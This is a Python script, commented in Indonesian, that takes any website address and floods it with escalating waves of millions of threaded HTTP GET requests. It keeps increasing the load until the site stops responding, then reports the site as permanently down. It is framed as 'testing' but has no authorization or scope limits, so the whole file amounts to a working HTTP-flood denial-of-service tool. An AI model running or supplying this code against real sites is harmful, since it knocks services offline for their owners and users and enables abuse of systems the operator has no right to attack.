import requests
import threading
import time
from datetime import datetime

# Konfigurasi awal
TARGET_URL = input("Masukkan alamat website yang akan diuji (contoh: http://example.com): ")  # Input alamat website
INITIAL_REQUESTS = 1000000  # Jumlah awal packet per pengiriman (1 juta)
THREAD_COUNT = 10  # Jumlah thread untuk paralelisme
INCREMENT = 1000000  # Penambahan packet setiap iterasi (1 juta)

# Variabel untuk melacak status
success_count = 0
failure_count = 0
start_time = None
total_sent = 0
website_down = False

def send_requests(thread_id, requests_per_thread):
    global success_count, failure_count, website_down
    
    for i in range(requests_per_thread):
        try:
            response = requests.get(TARGET_URL, timeout=5)
            if response.status_code == 200:
                success_count += 1
                print(f"[Thread {thread_id}] Packet {i+1}/{requests_per_thread} berhasil ke {TARGET_URL} - Status: {response.status_code}")
            else:
                failure_count += 1
                print(f"[Thread {thread_id}] Packet {i+1}/{requests_per_thread} gagal ke {TARGET_URL} - Status: {response.status_code}")
                if response.status_code >= 400:
                    print(f"[NOTIFIKASI] Website {TARGET_URL} mungkin mengalami masalah pada {datetime.now()}")
        
        except requests.exceptions.RequestException as e:
            failure_count += 1
            print(f"[Thread {thread_id}] Packet {i+1}/{requests_per_thread} gagal ke {TARGET_URL} - Error: {str(e)}")
            print(f"[NOTIFIKASI] Website {TARGET_URL} tidak dapat diakses pada {datetime.now()}")
            website_down = True  # Tandai website down jika ada error koneksi
    
    return website_down

def main():
    global success_count, failure_count, total_sent, start_time, website_down
    
    current_requests = INITIAL_REQUESTS
    
    while not website_down:
        success_count = 0
        failure_count = 0
        start_time = time.time()
        requests_per_thread = current_requests // THREAD_COUNT
        
        print(f"\nMengirim {current_requests:,} packets ke {TARGET_URL}")
        
        # Membuat dan memulai threads
        threads = []
        for i in range(THREAD_COUNT):
            thread = threading.Thread(target=send_requests, args=(i, requests_per_thread))
            threads.append(thread)
            thread.start()
        
        # Menunggu semua threads selesai
        for thread in threads:
            thread.join()
        
        # Update total packet yang dikirim
        total_sent += current_requests
        
        # Ringkasan per iterasi
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n=== Ringkasan Pengiriman {total_sent:,} Packets ===")
        print(f"Website yang diuji: {TARGET_URL}")
        print(f"Waktu mulai: {datetime.fromtimestamp(start_time)}")
        print(f"Waktu selesai: {datetime.fromtimestamp(end_time)}")
        print(f"Durasi: {duration:.2f} detik")
        print(f"Packet berhasil: {success_count}")
        print(f"Packet gagal: {failure_count}")
        print(f"Persentase keberhasilan: {(success_count/current_requests)*100:.2f}%")
        
        if website_down:
            print(f"[NOTIFIKASI FINAL] Website {TARGET_URL} tidak dapat diakses secara permanen setelah {total_sent:,} packets dikirim pada {datetime.now()}")
            break
        else:
            print(f"[STATUS] Website {TARGET_URL} masih dapat diakses. Meningkatkan jumlah packet...")
            current_requests += INCREMENT  # Tambah jumlah packet untuk iterasi berikutnya
            time.sleep(5)  # Jeda sebelum iterasi berikutnya untuk memberi waktu server pulih
        
    print(f"Pengujian selesai. Total packets dikirim: {total_sent:,}")

if __name__ == "__main__":
    main()